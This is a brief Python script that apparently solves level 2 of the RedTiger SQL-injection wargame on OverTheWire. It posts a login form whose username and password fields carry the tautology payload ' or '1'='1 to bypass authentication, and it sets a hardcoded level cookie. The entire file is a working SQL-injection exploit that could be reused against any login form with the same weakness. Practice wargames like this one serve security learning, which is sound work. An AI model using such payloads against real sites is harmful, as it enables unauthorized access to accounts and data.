import requests

url = "https://redtiger.labs.overthewire.org/level2.php"
cookies = {"level2login": "passwords_will_change_over_time_let_us_do_a_shitty_rhyme"}
data = {"username":"admin' or '1'='1", "password":"' or '1'='1", "login":"Login"}

r = requests.post(url, cookies=cookies, data=data)
print r.text